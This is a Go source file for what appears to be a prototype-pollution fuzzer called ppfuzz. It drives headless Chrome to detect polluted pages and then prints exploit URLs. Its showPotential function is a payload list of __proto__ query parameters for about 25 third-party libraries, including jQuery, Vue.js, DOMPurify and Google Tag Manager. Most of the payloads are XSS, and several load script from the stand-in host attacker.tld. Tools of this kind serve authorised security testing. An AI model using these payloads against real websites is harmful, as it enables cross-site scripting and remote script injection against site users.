package fuzzer

import (
	"context"
	"fmt"
	"net/url"
	"sync"

	"github.com/chromedp/chromedp"
	"ppfuzz/pkg/parser"
)

// New starts the fuzzing process.
func New(urls []string, browserCtx context.Context, opt *parser.Options) {
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, opt.Concurrency)

	for _, u := range urls {
		wg.Add(1)
		semaphore <- struct{}{}
		go func(u string) {
			defer wg.Done()
			defer func() { <-semaphore }()

			var polluted bool
			var gadgets []string
			err := chromedp.Run(browserCtx,
				chromedp.Navigate(u),
				chromedp.Evaluate(`(window.ppfuzz || Object.prototype.ppfuzz) == 'reserved' && true || false`, &polluted),
			)

			if err == nil && polluted {
				// Re-run with the fingerprint script
				err = chromedp.Run(browserCtx,
					chromedp.Navigate(u),
					chromedp.Evaluate(FingerprintJS, &gadgets),
				)

				if err == nil {
					fmt.Printf("[VULNERABLE] %s\n", u)
					if len(gadgets) > 0 {
						fingerprint(u, gadgets)
					}
				}
			}
		}(u)
	}

	wg.Wait()
}

func fingerprint(targetURL string, gadgets []string) {
	for _, gadget := range gadgets {
		showPotential(targetURL, gadget)
	}
}

func showPotential(targetURL, gadget string) {
	u, err := url.Parse(targetURL)
	if err != nil {
		return
	}

	params := url.Values{}

	switch gadget {
	case "Adobe Dynamic Tag Management":
		params.Add("__proto__[src]", "data:,alert(1)//")
	case "Akai Boomerang":
		params.Add("__proto__[BOOMR]", "1")
		params.Add("__proto__[url]", "//attacker.tld/js.js")
	case "Closure":
		params.Add("__proto__[CLOSURE_BASE_PATH]", "data:,alert(1)//")
	case "DOMPurify":
		params.Add("__proto__[ALLOWED_ATTR][0]", "onerror")
		params.Add("__proto__[ALLOWED_ATTR][1]", "src")
	case "Embedly":
		params.Add("__proto__[onload]", "alert(1)")
	case "jQuery":
		params.Add("__proto__[context]", "<img/src/onerror=alert(1)>")
		params.Add("__proto__[jquery]", "x")
	case "js-xss":
		params.Add("__proto__[whiteList][img][0]", "onerror")
		params.Add("__proto__[whiteList][img][1]", "src")
	case "Knockout.js":
		params.Add("__proto__[4]", "a':1,[alert(1)]:1,'b")
		params.Add("__proto__[5]", ",")
	case "Lodash <= 4.17.15":
		params.Add("__proto__[sourceURL]", "  alert(1)")
	case "Marionette.js / Backbone.js":
		params.Add("__proto__[tagName]", "img")
		params.Add("__proto__[src][]", "x:")
		params.Add("__proto__[onerror][]", "alert(1)")
	case "Google reCAPTCHA":
		params.Add("__proto__[srcdoc][]", "<script>alert(1)</script>")
	case "sanitize-html":
		params.Add("__proto__[*][]", "onload")
	case "Segment Analytics.js":
		params.Add("__proto__[script][0]", "1")
		params.Add("__proto__[script][1]", "<img/src/onerror=alert(1)>")
		params.Add("__proto__[script][2]", "1")
	case "Sprint.js":
		params.Add("__proto__[div][intro]", "<img src onerror=alert(1)>")
	case "Swiftype Site Search":
		params.Add("__proto__[xxx]", "alert(1)")
	case "Tealium Universal Tag":
		params.Add("__proto__[attrs][src]", "1")
		params.Add("__proto__[src]", "//attacker.tld/js.js")
	case "Twitter Universal Website Tag":
		params.Add("__proto__[attrs][src]", "1")
		params.Add("__proto__[hif][]", "javascript:alert(1)")
	case "Wistia Embedded Video":
		params.Add("__proto__[innerHTML]", "<img/src/onerror=alert(1)>")
	case "Zepto.js":
		params.Add("__proto__[onerror]", "alert(1)")
	case "Vue.js":
		params.Add("__proto__[v-if]", "_c.constructor('alert(1)')()")
	case "Demandbase Tag":
		params.Add("__proto__[Config][SiteOptimization][enabled]", "1")
		params.Add("//attacker.tld/json_cors.php?", "1")
	case "Google Tag Manager/Analytics":
		params.Add("__proto__[customScriptSrc]", "//attacker.tld/xss.js")
	case "i18next":
		params.Add("__proto__[lng]", "cimode")
		params.Add("__proto__[appendNamespaceToCIMode]", "x")
		params.Add("__proto__[nsSeparator]", "<img/src/onerror=alert(1)>")
	case "Google Analytics":
		params.Add("__proto__[cookieName]", "COOKIE=Injection;")
	case "Popper.js":
		params.Add("__proto__[arrow][style]", "color:red;transition:all 1s")
		params.Add("__proto__[arrow][ontransitionend]", "alert(1)")
	case "Pendo Agent":
		params.Add("__proto__[dataHost]", "attacker.tld/js.js#")
	default:
		return
	}

	u.RawQuery = params.Encode()
	fmt.Printf("  [INFO] %s (%s)\n", u.String(), gadget)
}
